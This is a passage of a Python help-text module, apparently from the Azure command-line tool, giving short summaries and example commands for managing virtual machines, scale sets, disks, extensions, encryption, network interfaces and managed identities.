https://mystor.blob.core.windows.net/\".format(vm_boot_diagnostics_enable)\nhelps[vm_boot_diagnostics_enable] = \"\"\"\n    type: command\n    short-summary: Enable the boot diagnostics on a VM.\n    parameters:\n        - name: --storage\n          short-summary: Name or URI of a storage account (e.g. https://your_storage_account_name.blob.core.windows.net/)\n    examples:\n{0}\n\"\"\".format(vm_ids_example.format('Enable boot diagnostics on all VMs in a resource group.', vm_boot_diagnostics_enable_cmd))\n\nboot_diagnostics_log = 'vm boot-diagnostics get-boot-log'\nhelps[boot_diagnostics_log] = \"\"\"\n    type: command\n    short-summary: Get the boot diagnostics log from a VM.\n    examples:\n{0}\n\"\"\".format(vm_ids_example.format('Get diagnostics logs for all VMs in a resource group.', boot_diagnostics_log))\n\nhelps['acs'] = \"\"\"\n    type: group\n    short-summary: Manage Azure Container Services.\n\"\"\"\n\nhelps['acs create'] = \"\"\"\n    type: command\n    short-summary: Create a container service.\n    examples:\n        - name: Create a Kubernetes container service and generate SSH keys to connect to it.\n          text: >\n            az acs create -g MyResourceGroup -n MyContainerService --orchestrator-type kubernetes --generate-ssh-keys\n\"\"\"\n\nhelps['acs delete'] = \"\"\"\n    type: command\n    short-summary: Delete a container service.\n\"\"\"\n\nhelps['acs list'] = \"\"\"\n    type: command\n    short-summary: List container services.\n\"\"\"\n\nhelps['acs show'] = \"\"\"\n    type: command\n    short-summary: Get the details for a container service.\n\"\"\"\n\nhelps['acs scale'] = \"\"\"\n    type: command\n    short-summary: Change the private agent count of a container service.\n\"\"\"\n\nhelps['vm diagnostics'] = \"\"\"\n    type: group\n    short-summary: Configure the Azure Virtual Machine diagnostics extension.\n\"\"\"\n\nhelps['vm diagnostics get-default-config'] = \"\"\"\n    type: command\n    short-summary: Get the default configuration settings for a VM.\n    examples:\n        - name: Get the default diagnostics for a Linux VM and override the storage account name and the VM resource ID.\n          text: |\n            az vm diagnostics get-default-config \\\\\n                | sed \"s#__DIAGNOSTIC_STORAGE_ACCOUNT__#MyStorageAccount#g\" \\\\\n                | sed \"s#__VM_OR_VMSS_RESOURCE_ID__#MyVmResourceId#g\"\n        - name: Get the default diagnostics for a Windows VM.\n          text: >\n            az vm diagnostics get-default-config --is-windows-os\n\"\"\"\n\nhelps['vm diagnostics set'] = \"\"\"\n    type: command\n    short-summary: Configure the Azure VM diagnostics extension.\n    examples:\n        - name: Set up default diagnostics on a Linux VM for Azure Portal VM metrics graphs and syslog collection.\n          text: |\n                # Set the following 3 parameters first.\n                my_resource_group=<Resource group name containing your Linux VM and the storage account>\n                my_linux_vm=<Your Azure Linux VM name>\n                my_diagnostic_storage_account=<Your Azure storage account for storing VM diagnostic data>\n\n                my_vm_resource_id=$(az vm show -g $my_resource_group -n $my_linux_vm --query \"id\" -o tsv)\n\n                default_config=$(az vm diagnostics get-default-config \\\\\n                    | sed \"s#__DIAGNOSTIC_STORAGE_ACCOUNT__#$my_diagnostic_storage_account#g\" \\\\\n                    | sed \"s#__VM_OR_VMSS_RESOURCE_ID__#$my_vm_resource_id#g\")\n\n                storage_sastoken=$(az storage account generate-sas \\\\\n                    --account-name $my_diagnostic_storage_account --expiry 2037-12-31T23:59:00Z \\\\\n                    --permissions wlacu --resource-types co --services bt -o tsv)\n\n                protected_settings=\"{'storageAccountName': '$my_diagnostic_storage_account', \\\\\n                    'storageAccountSasToken': '$storage_sastoken'}\"\n\n                az vm diagnostics set --settings \"$default_config\" \\\\\n                    --protected-settings \"$protected_settings\" \\\\\n                    --resource-group $my_resource_group --vm-name $my_linux_vm\n\n        - name: Set up default diagnostics on a Windows VM.\n          text: |\n                # Set the following 3 parameters first.\n                my_resource_group=<Resource group name containing your Windows VM and the storage account>\n                my_windows_vm=<Your Azure Windows VM name>\n                my_diagnostic_storage_account=<Your Azure storage account for storing VM diagnostic data>\n\n                my_vm_resource_id=$(az vm show -g $my_resource_group -n $my_windows_vm --query \"id\" -o tsv)\n\n                default_config=$(az vm diagnostics get-default-config  --is-windows-os \\\\\n                    | sed \"s#__DIAGNOSTIC_STORAGE_ACCOUNT__#$my_diagnostic_storage_account#g\" \\\\\n                    | sed \"s#__VM_OR_VMSS_RESOURCE_ID__#$my_vm_resource_id#g\")\n\n                # Please use the same options, the WAD diagnostic extension has strict\n                # expectations of the sas token's format. Set the expiry as desired.\n                storage_sastoken=$(az storage account generate-sas \\\\\n                    --account-name $my_diagnostic_storage_account --expiry 2037-12-31T23:59:00Z \\\\\n                    --permissions acuw --resource-types co --services bt --https-only --output tsv)\n\n                protected_settings=\"{'storageAccountName': '$my_diagnostic_storage_account', \\\\\n                    'storageAccountSasToken': '$storage_sastoken'}\"\n\n                # # Alternatively, if the WAD extension has issues parsing the sas token,\n                # # one can use a storage account key.\n                # storage_account_key=$(az storage account keys list --account-name tosinstorage1win \\\\\n                #   --query [0].value -o tsv)\n                # protected_settings=\"{'storageAccountName': '$my_diagnostic_storage_account', \\\\\n                #   'storageAccountKey': '$storage_account_key'}\"\n\n                az vm diagnostics set --settings \"$default_config\" \\\\\n                    --protected-settings \"$protected_settings\" \\\\\n                    --resource-group $my_resource_group --vm-name $my_windows_vm\n\"\"\"\n\ndisk_long_summary = \"\"\"\n        Just like any other computer, virtual machines in Azure use disks as a place to store an operating system, applications, and data.\n        All Azure virtual machines have at least two disks: An operating system disk, and a temporary disk.\n        The operating system disk is created from an image, and both the operating system disk and the image are actually virtual hard disks (VHDs)\n        stored in an Azure storage account. Virtual machines also can have one or more data disks, that are also stored as VHDs.\n\n        Operating System Disk\n        Every virtual machine has one attached operating system disk. It's registered as a SATA drive and is labeled /dev/sda by default.\n        This disk has a maximum capacity of 1023 gigabytes (GB).\n\n        Temporary disk\n        The temporary disk is automatically created for you. On Linux virtual machines, the disk is typically /dev/sdb and is formatted and\n        mounted to /mnt/resource by the Azure Linux Agent. The size of the temporary disk varies, based on the size of the virtual machine.\n\n        Data disk\n        A data disk is a VHD that's attached to a virtual machine to store application data, or other data you need to keep. Data disks are\n        registered as SCSI drives and are labeled by the creator. Each data disk has a maximum capacity of 1023 GB. The size of the virtual\n        machine determines how many data disks can be attached and the type of storage that can be used to host the disks.\n\"\"\"\n\nhelps['vm disk'] = \"\"\"\n    type: group\n    short-summary: Manage the managed data disks attached to a VM.\n    long-summary: >\n{0}\n\"\"\".format(disk_long_summary)\n\nhelps['vm unmanaged-disk'] = \"\"\"\n    type: group\n    short-summary: Manage the unmanaged data disks attached to a VM.\n    long-summary: >\n{0}\n\"\"\".format(disk_long_summary)\n\nhelps['vm unmanaged-disk attach'] = \"\"\"\n    type: command\n    short-summary: Attach an unmanaged persistent disk to a VM.\n    long-summary: This allows for the preservation of data, even if the VM is reprovisioned due to maintenance or resizing.\n    examples:\n        - name: Attach a new default sized (1023 GB) unmanaged data disk to a VM.\n          text: az vm unmanaged-disk attach -g MyResourceGroup --vm-name MyVm\n        - name: Attach an existing data disk to a VM as unmanaged.\n          text: >\n            az vm unmanaged-disk attach -g MyResourceGroup --vm-name MyVm \\\\\n                --vhd-uri https://mystorage.blob.core.windows.net/vhds/d1.vhd\n\"\"\"\n\nhelps['vm unmanaged-disk detach'] = \"\"\"\n    type: command\n    short-summary: Detach an unmanaged disk from a VM.\n    examples:\n        - name: Detach a data disk from a VM.\n          text: >\n            az vm unmanaged-disk detach -g MyResourceGroup --vm-name MyVm -n disk_name\n\"\"\"\n\nhelps['vm unmanaged-disk list'] = \"\"\"\n    type: command\n    short-summary: List unmanaged disks of a VM.\n    examples:\n        - name: List the unmanaged disks attached to a VM.\n          text: az vm unmanaged-disk list -g MyResourceGroup --vm-name MyVm\n        - name: List unmanaged disks with IDs containing the string \"data_disk\".\n          text: >\n            az vm unmanaged-disk list --ids \\\\\n                $(az resource list --query \"[?contains(name, 'data_disk')].id\" -o tsv)\n\"\"\"\n\nhelps['vm disk detach'] = \"\"\"\n    type: command\n    short-summary: Detach a managed disk from a VM.\n    examples:\n        - name: Detach a data disk from a VM.\n          text: >\n            az vm disk detach -g MyResourceGroup --vm-name MyVm -n disk_name\n\"\"\"\n\nhelps['vm disk attach'] = \"\"\"\n    type: command\n    short-summary: Attach a managed persistent disk to a VM.\n    long-summary: This allows for the preservation of data, even if the VM is reprovisioned due to maintenance or resizing.\n    examples:\n        - name: Attach a new default sized (1023 GB) managed data disk to a VM.\n          text: az vm disk attach -g MyResourceGroup --vm-name MyVm --disk disk_name --new\n\"\"\"\n\nhelps['vm encryption'] = \"\"\"\n    type: group\n    short-summary: Manage encryption of VM disks.\n\"\"\"\n\nhelps['vm encryption enable'] = \"\"\"\n    type: command\n    short-summary: Enable disk encryption on the OS disk and/or data disks.\n    parameters:\n        - name: --aad-client-id\n          short-summary: Client ID of an AAD app with permissions to write secrets to the key vault.\n        - name: --aad-client-secret\n          short-summary: Client secret of the AAD app with permissions to write secrets to the key vault.\n        - name: --aad-client-cert-thumbprint\n          short-summary: Thumbprint of the AAD app certificate with permissions to write secrets to the key vault.\n\"\"\"\n\nhelps['vm encryption disable'] = \"\"\"\n    type: command\n    short-summary: Disable disk encryption on the OS disk and/or data disks.\n\"\"\"\n\nhelps['vm encryption show'] = \"\"\"\n    type: command\n    short-summary: Show encryption status.\n\"\"\"\n\nhelps['vm extension'] = \"\"\"\n    type: group\n    short-summary: Manage extensions on VMs.\n    long-summary: >\n        Extensions are small applications that provide post-deployment configuration and automation tasks on Azure virtual machines.\n        For example, if a virtual machine requires software installation, anti-virus protection, or Docker configuration, a VM extension\n        can be used to complete these tasks. Extensions can be bundled with a new virtual machine deployment or run against any existing system.\n\"\"\"\n\nhelps['vm extension list'] = \"\"\"\n    type: command\n    short-summary:  List the extensions attached to a VM.\n    examples:\n        - name: List attached extensions to a named VM.\n          text: az vm extension list -g MyResourceGroup --vm-name MyVm\n        - name: List attached extensions with IDs containing the string \"MyExtension\".\n          text: >\n            az vm extension list --ids \\\\\n                $(az resource list --query \"[?contains(name, 'MyExtension')].id\" -o tsv)\n\"\"\"\n\nhelps['vm extension delete'] = \"\"\"\n    type: command\n    short-summary: Remove an extension attached to a VM.\n    examples:\n        - name: Use a VM name and extension to delete an extension from a VM.\n          text: az vm extension delete -g MyResourceGroup --vm-name MyVm -n extension_name\n        - name: Delete extensions with IDs containing the string \"MyExtension\" from a VM.\n          text: >\n            az vm extension delete --ids \\\\\n                $(az resource list --query \"[?contains(name, 'MyExtension')].id\" -o tsv)\n\"\"\"\n\nhelps['vm extension show'] = \"\"\"\n    type: command\n    short-summary: Display information about extensions attached to a VM.\n    examples:\n        - name: Use VM name and extension name to show the extensions attached to a VM.\n          text: az vm extension show -g MyResourceGroup --vm-name MyVm -n extension_name\n\"\"\"\n\nhelps['vm extension image'] = \"\"\"\n    type: group\n    short-summary: Find the available VM extensions for a subscription and region.\n\"\"\"\n\nhelps['vm extension image list'] = \"\"\"\n    type: command\n    short-summary: List the information on available extensions.\n    examples:\n        - name: List the unique publishers for extensions.\n          text: az vm extension image list --query \"[].publisher\" -o tsv | sort -u\n        - name: Find extensions with \"Docker\" in the name.\n          text: az vm extension image list --query \"[].name\" -o tsv | sort -u | grep Docker\n        - name: List extension names where the publisher name starts with \"Microsoft.Azure.App\".\n          text: |\n            az vm extension image list --query \\\\\n                \"[?starts_with(publisher, 'Microsoft.Azure.App')].publisher\" \\\\\n                -o tsv | sort -u | xargs -I{} az vm extension image list-names --publisher {} -l westus\n\"\"\"\n\nhelps['vm extension image list-names'] = \"\"\"\n    type: command\n    short-summary: List the names of available extensions.\n    examples:\n        - name: Find Docker extensions by publisher and location.\n          text: >\n            az vm extension image list-names --publisher Microsoft.Azure.Extensions \\\\\n                -l westus --query \"[?starts_with(name, 'Docker')]\"\n        - name: Find CustomScript extensions by publisher and location.\n          text: >\n            az vm extension image list-names --publisher Microsoft.Azure.Extensions \\\\\n                -l westus --query \"[?starts_with(name, 'Custom')]\"\n\"\"\"\n\nhelps['vm extension image list-versions'] = \"\"\"\n    type: command\n    short-summary: List the versions for available extensions.\n    examples:\n        - name: Find the available versions for the Docker extension.\n          text: >\n            az vm extension image list-versions --publisher Microsoft.Azure.Extensions \\\\\n                -l westus -n DockerExtension -otable\n\"\"\"\n\nhelps['vm extension image show'] = \"\"\"\n    type: command\n    short-summary: Display information for an extension.\n    examples:\n        - name: Show the CustomScript extension version 2.0.2.\n          text: >\n            az vm extension image show -l westus -n CustomScript \\\\\n              --publisher Microsoft.Azure.Extensions --version 2.0.2\n        - name: Show the latest version of the Docker extension.\n          text: >\n            publisher=Microsoft.Azure.Extensions\\n\n            extension=DockerExtension\\n\n            location=westus\\n\n\n            latest=$(az vm extension image list-versions \\\\\n              --publisher {publisher} -l {location} -n {extension} \\\\\n              --query \"[].name\" -o tsv | sort | tail -n 1)\n\n            az vm extension image show -l {location} \\\\\n              --publisher {publisher} -n {extension} --version {latest}\n\"\"\"\n\nhelps['vm image'] = \"\"\"\n    type: group\n    short-summary: Information on available virtual machine images.\n\"\"\"\n\nhelps['vm image list'] = \"\"\"\n    type: command\n    short-summary: List the VM/VMSS images available in the Azure Marketplace.\n    parameters:\n        - name: --all\n          short-summary: Retrieve image list from live Azure service rather using an offline image list\n        - name: --offer -f\n          short-summary: Image offer name, partial name is accepted\n        - name: --publisher -p\n          short-summary: Image publisher name, partial name is accepted\n        - name: --sku -s\n          short-summary: Image sku name, partial name is accepted\n    examples:\n        - name: List all available images.\n          text: az vm image list --all\n        - name: List all offline cached CentOS images.\n          text: az vm image list -f CentOS\n        - name: List all CentOS images.\n          text: az vm image list -f CentOS --all\n\"\"\"\n\nhelps['vm image list-offers'] = \"\"\"\n    type: command\n    short-summary: List the VM image offers available in the Azure Marketplace.\n    parameters:\n        - name: --publisher -p\n          populator-commands:\n          - az vm list-publishers\n    examples:\n        - name: List all offers from Microsoft in the West US region.\n          text: az vm image list-offers -l westus -p MicrosoftWindowsServer\n        - name: List all offers from OpenLocic in the West US region.\n          text: az vm image list-offers -l westus -p OpenLogic\n\"\"\"\n\nhelps['vm image list-publishers'] = \"\"\"\n    type: command\n    short-summary: List the VM image publishers available in the Azure Marketplace.\n    examples:\n        - name: List all publishers in the West US region.\n          text: az vm image list-publishers -l westus\n        - name: List all publishers with names starting with \"Open\" in westus.\n          text: az vm image list-publishers -l westus --query \"[?starts_with(name, 'Open')]\"\n\"\"\"\n\nhelps['vm image list-skus'] = \"\"\"\n    type: command\n    short-summary: List the VM image SKUs available in the Azure Marketplace.\n    parameters:\n        - name: --publisher -p\n          populator-commands:\n          - az vm list-publishers\n    examples:\n        - name: List all skus available for CentOS published by OpenLogic in the West US region.\n          text: az vm image list-skus -l westus -f CentOS -p OpenLogic\n\"\"\"\n\nhelps['vm image show'] = \"\"\"\n    type: command\n    short-summary: Get the details for a VM image available in the Azure Marketplace.\n    examples:\n        - name: Show information for the latest available CentOS image from OpenLogic.\n          text: >\n            latest=$(az vm image list -p OpenLogic -s 7.3 --all --query \\\\\n                \"[?offer=='CentOS'].version\" -o tsv | sort -u | tail -n 1)\n            az vm image show -l westus -f CentOS -p OpenLogic --sku 7.3 --version {latest}\n\"\"\"\n\nhelps['vm image accept-terms'] = \"\"\"\n    type: command\n    short-summary: Accept Azure Marketplace term so that the image can be used to create VMs\n\"\"\"\n\nhelps['vm nic'] = \"\"\"\n    type: group\n    short-summary: Manage network interfaces. See also `az network nic`.\n    long-summary: >\n        A network interface (NIC) is the interconnection between a VM and the underlying software\n        network. For more information, see https://docs.microsoft.com/azure/virtual-network/virtual-network-network-interface-overview.\n\"\"\"\n\nhelps['vm nic list'] = \"\"\"\n    type: command\n    short-summary: List the NICs available on a VM.\n    examples:\n        - name: List all of the NICs on a VM.\n          text: az vm nic list -g MyResourceGroup --vm-name MyVm\n\"\"\"\n\nhelps['vm nic add'] = \"\"\"\n    type: command\n    short-summary: Add existing NICs to a VM.\n    examples:\n        - name: Add two NICs to a VM.\n          text: az vm nic add -g MyResourceGroup --vm-name MyVm --nics nic_name1 nic_name2\n\"\"\"\n\nhelps['vm nic remove'] = \"\"\"\n    type: command\n    short-summary: Remove NICs from a VM.\n    examples:\n        - name: Remove two NICs from a VM.\n          text: az vm nic remove -g MyResourceGroup --vm-name MyVm --nics nic_name1 nic_name2\n\"\"\"\n\nhelps['vm nic show'] = \"\"\"\n    type: command\n    short-summary: Display information for a NIC attached to a VM.\n    examples:\n        - name: Show details of a NIC on a VM.\n          text: az vm nic show -g MyResourceGroup --vm-name MyVm --nic nic_name1\n\"\"\"\n\nhelps['vm nic set'] = \"\"\"\n    type: command\n    short-summary: Configure settings of a NIC attached to a VM.\n    examples:\n        - name: Set a NIC on a VM to be the primary interface.\n          text: az vm nic set -g MyResourceGroup --vm-name MyVm --nic nic_name1 nic_name2 --primary-nic nic_name2\n\"\"\"\n\nhelps['vmss'] = \"\"\"\n    type: group\n    short-summary: Manage groupings of virtual machines in an Azure Virtual Machine Scale Set (VMSS).\n\"\"\"\n\nhelps['vmss diagnostics'] = \"\"\"\n    type: group\n    short-summary: Configure the Azure Virtual Machine Scale Set diagnostics extension.\n\"\"\"\n\nhelps['vmss diagnostics get-default-config'] = \"\"\"\n    type: command\n    short-summary: Show the default config file which defines data to be collected.\n\"\"\"\n\nhelps['vmss diagnostics set'] = \"\"\"\n    type: command\n    short-summary: Enable diagnostics on a VMSS.\n\"\"\"\n\n\nhelps['vmss list-instance-connection-info'] = \"\"\"\n    type: command\n    short-summary: Get the IP address and port number used to connect to individual VM instances within a set.\n\"\"\"\n\nhelps['vmss list-instance-public-ips'] = \"\"\"\n    type: command\n    short-summary: List public IP addresses of VM instances within a set.\n\"\"\"\n\nhelps['vmss extension'] = \"\"\"\n    type: group\n    short-summary: Manage extensions on a VM scale set.\n\"\"\"\n\nhelps['vmss extension delete'] = \"\"\"\n    type: command\n    short-summary: Delete an extension from a VMSS.\n\"\"\"\n\nhelps['vmss extension list'] = \"\"\"\n    type: command\n    short-summary: List extensions associated with a VMSS.\n\"\"\"\n\nhelps['vmss extension set'] = \"\"\"\n    type: command\n    short-summary: Add an extension to a VMSS or update an existing extension.\n    long-summary: Get extension details from `az vmss extension image list`.\n    parameters:\n    - name: --name -n\n      populator-commands:\n      - az vm extension image list\n    examples:\n        - name: >\n                Set an extension which depends on two previously set extensions. That is, When a VMSS instance is\n                created or reimaged, the customScript extension will be provisioned only after all extensions that\n                it depends on have been provisioned. The extension need not depend on the other extensions for\n                pre-requisite configurations.\n          text: >\n                az vmss extension set --vmss-name my-vmss --name customScript --resource-group my-group \\\\\n                    --version 2.0 --publisher Microsoft.Azure.Extensions \\\\\n                    --provision-after-extensions NetworkWatcherAgentLinux VMAccessForLinux  \\\\\n                    --settings '{\\\"commandToExecute\\\": \\\"echo testing\\\"}'\n\"\"\"\n\nhelps['vmss extension show'] = \"\"\"\n    type: command\n    short-summary: Show details on a VMSS extension.\n\"\"\"\n\nhelps['vmss extension image'] = \"\"\"\n    type: group\n    short-summary: Find the available VM extensions for a subscription and region.\n\"\"\"\n\nhelps['vmss extension image list'] = \"\"\"\n    type: command\n    short-summary: List the information on available extensions.\n    examples:\n        - name: List the unique publishers for extensions.\n          text: az vmss extension image list --query \"[].publisher\" -o tsv | sort -u\n        - name: Find extensions with \"Docker\" in the name.\n          text: az vmss extension image list --query \"[].name\" -o tsv | sort -u | grep Docker\n        - name: List extension names where the publisher name starts with \"Microsoft.Azure.App\".\n          text: |\n            az vmss extension image list --query \\\\\n                \"[?starts_with(publisher, 'Microsoft.Azure.App')].publisher\" \\\\\n                -o tsv | sort -u | xargs -I{} az vmss extension image list-names --publisher {} -l westus\n\"\"\"\n\n\ndeallocate_generalize_capture = \"\"\"        - name: Deallocate, generalize, and capture a stopped virtual machine.\n          text: |\n            az vm deallocate -g MyResourceGroup -n MyVm\n            az vm generalize -g MyResourceGroup -n MyVm\n            az vm capture -g MyResourceGroup -n MyVm --vhd-name-prefix MyPrefix\n        - name: Deallocate, generalize, and capture multiple stopped virtual machines.\n          text: |\n            vms_ids=$(az vm list -g MyResourceGroup --query \"[].id\" -o tsv)\n            az vm deallocate --ids {vms_ids}\n            az vm generalize --ids {vms_ids}\n            az vm capture --ids {vms_ids} --vhd-name-prefix MyPrefix\n\"\"\"\n\nhelps['vmss encryption'] = \"\"\"\n    type: group\n    short-summary: (PREVIEW) Manage encryption of VMSS.\n\"\"\"\n\nhelps['vmss encryption enable'] = \"\"\"\n    type: command\n    short-summary: Encrypt a VMSS with managed disks.\n    examples:\n        - name: encrypt a VM scale set using a key vault in the same resource group\n          text: >\n            az vmss encryption enable -g MyResourceGroup -n MyVm --disk-encryption-keyvault myvault\n\"\"\"\n\nhelps['vmss encryption disable'] = \"\"\"\n    type: command\n    short-summary: Disable the encryption on a VMSS with managed disks.\n    examples:\n        - name: disable encryption a VMSS\n          text: >\n            az vmss encryption disable -g MyResourceGroup -n MyVm\n\"\"\"\n\nhelps['vmss encryption show'] = \"\"\"\n    type: command\n    short-summary: Show encryption status.\n\"\"\"\n\nhelps['vm capture'] = \"\"\"\n    type: command\n    short-summary: Capture information for a stopped VM.\n    long-summary: 'For an end-to-end tutorial, see https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-capture-image'\n    parameters:\n        - name: --vhd-name-prefix\n          type: string\n          short-summary: The VHD name prefix specify for the VM disks.\n        - name: --storage-container\n          short-summary: The storage account container name in which to save the disks.\n        - name: --overwrite\n          short-summary: Overwrite the existing disk file.\n    examples:\n{0}\n\"\"\".format(deallocate_generalize_capture)\n\nhelps['vm delete'] = \"\"\"\n    type: command\n    short-summary: Delete a VM.\n    examples:\n        - name: Delete a VM without a prompt for confirmation.\n          text: >\n            az vm delete -g MyResourceGroup -n MyVm --yes\n{0}\n\"\"\".format(vm_ids_example.format('Delete all VMs in a resource group.', 'vm delete'))\n\nhelps['vm deallocate'] = \"\"\"\n    type: command\n    short-summary: Deallocate a VM.\n    long-summary: 'For an end-to-end tutorial, see https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-capture-image'\n    examples:\n{0}\n\"\"\".format(deallocate_generalize_capture)\n\nhelps['vm generalize'] = \"\"\"\n    type: command\n    short-summary: Mark a VM as generalized, allowing it to be imaged for multiple deployments.\n    long-summary: 'For an end-to-end tutorial, see https://docs.microsoft.com/azure/virtual-machines/virtual-machines-linux-capture-image'\n    examples:\n{0}\n\"\"\".format(deallocate_generalize_capture)\n\nhelps['vm get-instance-view'] = \"\"\"\n    type: command\n    short-summary: Get instance information about a VM.\n    examples:\n        - name: Use a resource group and name to get instance view information of a VM.\n          text: az vm get-instance-view -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Get instance views for all VMs in a resource group.', 'vm get-instance-view'))\n\nhelps['vm list'] = \"\"\"\n    type: command\n    short-summary: List details of Virtual Machines.\n    long-summary: 'For more information on querying information about Virtual Machines, see https://docs.microsoft.com/en-us/cli/azure/query-az-cli2'\n    examples:\n        - name: List all VMs.\n          text: az vm list\n        - name: List all VMs by resource group.\n          text: az vm list -g MyResourceGroup\n        - name: List all VMs by resource group with details.\n          text: az vm list -g MyResourceGroup -d\n\"\"\"\n\nhelps['vm list-ip-addresses'] = \"\"\"\n    type: command\n    short-summary: List IP addresses associated with a VM.\n    examples:\n        - name: Get the IP addresses for a VM.\n          text: az vm list-ip-addresses -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Get IP addresses for all VMs in a resource group.', 'vm list-ip-addresses'))\n\nhelps['vm list-sizes'] = \"\"\"\n    type: command\n    short-summary: List available sizes for VMs.\n    examples:\n        - name: List the available VM sizes in the West US region.\n          text: az vm list-sizes -l westus\n\"\"\"\n\nhelps['vm list-usage'] = \"\"\"\n    type: command\n    short-summary: List available usage resources for VMs.\n    examples:\n        - name: Get the compute resource usage for the West US region.\n          text: az vm list-usage -l westus\n\"\"\"\n\nhelps['vm list-vm-resize-options'] = \"\"\"\n    type: command\n    short-summary: List available resizing options for VMs.\n    examples:\n        - name: List all available VM sizes for resizing.\n          text: az vm list-vm-resize-options -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('List available sizes for all VMs in a resource group.', 'vm list-vm-resize-options'))\n\nhelps['vm list-skus'] = \"\"\"\n    type: command\n    short-summary: Get details for compute-related resource SKUs.\n    long-summary: This command incorporates subscription level restriction, offering the most accurate information.\n    examples:\n        - name: List all SKUs in the West US region.\n          text: az vm list-skus -l westus\n        - name: List all available vm sizes in the East US2 region which support availability zone.\n          text: az vm list-skus -l eastus2 --zone\n        - name: List all available vm sizes in the East US2 region which support availability zone with name like \"standard_ds1...\".\n          text: az vm list-skus -l eastus2 --zone --size standard_ds1\n        - name: List availability set related sku information in The West US region.\n          text: az vm list-skus -l westus --resource-type availabilitySets\n\"\"\"\n\nhelps['vm open-port'] = \"\"\"\n    type: command\n    short-summary: Opens a VM to inbound traffic on specified ports.\n    long-summary: >\n        Adds a security rule to the network security group (NSG) that is attached to the VM's\n        network interface (NIC) or subnet. The existing NSG will be used or a new one will be\n        created. The rule name is 'open-port-{{port}}' and will overwrite an existing rule with\n        this name. For multi-NIC VMs, or for more fine-grained control, use the appropriate\n        network commands directly (nsg rule create, etc).\n    examples:\n        - name: Open all ports on a VM to inbound traffic.\n          text: az vm open-port -g MyResourceGroup -n MyVm --port '*'\n        - name: Open a range of ports on a VM to inbound traffic with the highest priority.\n          text: az vm open-port -g MyResourceGroup -n MyVm --port 80-100 --priority 100\n{0}\n\"\"\".format(vm_ids_example.format('Open all ports for all VMs in a resource group.', 'vm open-port'))\n\nhelps['vm redeploy'] = \"\"\"\n    type: command\n    short-summary: Redeploy an existing VM.\n    examples:\n        - name: Redeploy a VM.\n          text: az vm redeploy -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Redeploy all VMs in a resource group.', 'vm redeploy'))\n\nhelps['vm resize'] = \"\"\"\n    type: command\n    short-summary: Update a VM's size.\n    parameters:\n        - name: --size\n          type: string\n          short-summary: The VM size.\n          populator-commands:\n          - az vm list-vm-resize-options\n    examples:\n        - name: Resize a VM.\n          text: az vm resize -g MyResourceGroup -n MyVm --size Standard_DS3_v2\n{0}\n\"\"\".format(vm_ids_example.format('Resize all VMs in a resource group.', 'vm resize --size Standard_DS3_v2'))\n\nhelps['vm restart'] = \"\"\"\n    type: command\n    short-summary: Restart VMs.\n    examples:\n        - name: Restart a VM.\n          text: az vm restart -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Restart all VMs in a resource group.', 'vm restart'))\n\nhelps['vm show'] = \"\"\"\n    type: command\n    short-summary: Get the details of a VM.\n    examples:\n        - name: Show information about a VM.\n          text: az vm show -g MyResourceGroup -n MyVm -d\n{0}\n\"\"\".format(vm_ids_example.format('Get the details for all VMs in a resource group.', 'vm show -d'))\n\nhelps['vm start'] = \"\"\"\n    type: command\n    short-summary: Start a stopped VM.\n    examples:\n        - name: Start a stopped VM.\n          text: az vm start -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Start all VMs in a resource group.', 'vm start'))\n\nhelps['vm stop'] = \"\"\"\n    type: command\n    short-summary: Power off (stop) a running VM.\n    long-summary: The VM will continue to be billed. To avoid this, you can deallocate the VM through \"az vm deallocate\"\n    examples:\n        - name: Power off (stop) a running VM.\n          text: az vm stop -g MyResourceGroup -n MyVm\n{0}\n\"\"\".format(vm_ids_example.format('Stop all VMs in a resource group.', 'vm stop'))\n\nhelps['vm wait'] = \"\"\"\n    type: command\n    short-summary: Place the CLI in a waiting state until a condition of the VM is met.\n    examples:\n        - name: Wait until a VM is created.\n          text: az vm wait -g MyResourceGroup -n MyVm --created\n{0}\n\"\"\".format(vm_ids_example.format('Wait until all VMs in a resource group are deleted.', 'vm wait --deleted'))\n\nhelps['vm identity'] = \"\"\"\n    type: group\n    short-summary: manage service identities of a VM\n\"\"\"\n\nhelps['vm identity assign'] = \"\"\"\n    type: command\n    short-summary: Enable managed service identity on a VM.\n    long-summary: This is required to authenticate and interact with other Azure services using bearer tokens.\n    examples:\n        - name: Enable the system assigned identity on a VM with the 'Reader' role.\n          text: az vm identity assign -g MyResourceGroup -n MyVm --role Reader --scope /subscriptions/db5eb68e-73e2-4fa8-b18a-0123456789999/resourceGroups/MyResourceGroup\n        - name: Enable the system assigned identity and a user assigned identity on a VM.\n          text: az vm identity assign -g MyResourceGroup -n MyVm --role Reader --identities [system] myAssignedId\n\"\"\"\n\nhelps['vm identity remove'] = \"\"\"\n    type: command\n    short-summary: Remove managed service identities from a VM.\n    examples:\n        - name: Remove the system assigned identity\n          text: az vm identity remove -g MyResourceGroup -n MyVm\n        - name: Remove a user assigned identity\n          text: az vm identity remove -g MyResourceGroup -n MyVm --identities readerId\n        - name: Remove 2 identities which are in the same resource group with the VM\n          text: az vm identity remove -g MyResourceGroup -n MyVm --identities readerId writerId\n        - name: Remove the system assigned identity and a user identity\n          text: az vm identity remove -g MyResourceGroup -n MyVm --identities [system] readerId\n\"\"\"\n\nhelps['vm identity show'] = \"\"\"\n    type: command\n    short-summary: display VM's managed identity info.\n\"\"\"\n\nhelps['vm run-command'] = \"\"\"\n    type: group\n    short-summary: Manage run commands on a Virtual Machine.\n    long-summary: 'For more information, see https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command or https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command.'\n\"\"\"\n\nhelps['vm run-command invoke'] = \"\"\"\n    type: command\n    short-summary: Execute a specific run command on a vm.\n    examples:\n        - name: install nginx on a vm\n          text: az vm run-command invoke -g MyResourceGroup -n MyVm --command-id RunShellScript --scripts \"sudo apt-get update && sudo apt-get install -y nginx\"\n        - name: invoke command with parameters\n          text: az vm run-command invoke -g MyResourceGroup -n MyVm --command-id RunShellScript 